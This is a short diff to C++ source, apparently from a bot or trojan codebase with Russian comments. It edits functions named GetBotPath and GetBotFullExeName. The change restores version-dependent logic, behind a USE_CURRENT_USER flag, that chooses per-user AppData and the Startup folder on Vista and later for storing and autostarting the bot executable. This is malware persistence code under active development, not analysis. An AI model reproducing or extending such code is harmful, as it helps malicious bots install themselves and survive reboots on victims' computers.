@@ -628,18 +628,19 @@ string BOT::GetBotPath()
 		int CSIDL =  CSIDL_COMMON_APPDATA;
 
 		// Временный патч. В Висте и старше получаем папку текущего юзера
-//		OSVERSIONINFOEXA OSVersion;
-//
-//		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-//
-//		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
-//		{
-//			if ( OSVersion.dwMajorVersion >= 6 )
-//			{
-//				CSIDL =  CSIDL_APPDATA;
-//			}
-//		}
+		#ifdef USE_CURRENT_USER
+			OSVERSIONINFOEXA OSVersion;
 
+			OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+
+			if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
+			{
+				if ( OSVersion.dwMajorVersion >= 6 )
+				{
+					CSIDL =  CSIDL_APPDATA;
+				}
+			}
+        #endif
 
 
 		// Создаём путь
@@ -756,18 +757,20 @@ string BOT::GetBotFullExeName()
 
 		// Временный патч. В Висте и старше получаем папку текущего юзера
 		int CSIDL = CSIDL_COMMON_STARTUP;
-//
-//		OSVERSIONINFOEXA OSVersion;
-//
-//		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-//
-//		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
-//		{
-//			if ( OSVersion.dwMajorVersion >= 6 )
-//			{
-//				CSIDL =  CSIDL_STARTUP;
-//			}
-//		}
+
+		#ifdef USE_CURRENT_USER
+			OSVERSIONINFOEXA OSVersion;
+
+			OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+
+			if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
+			{
+				if ( OSVersion.dwMajorVersion >= 6 )
+				{
+					CSIDL =  CSIDL_STARTUP;
+				}
+			}
+		#endif
 
 
 		BotData->BotExeName = GetSpecialFolderPathA(CSIDL, GetBotExeName());
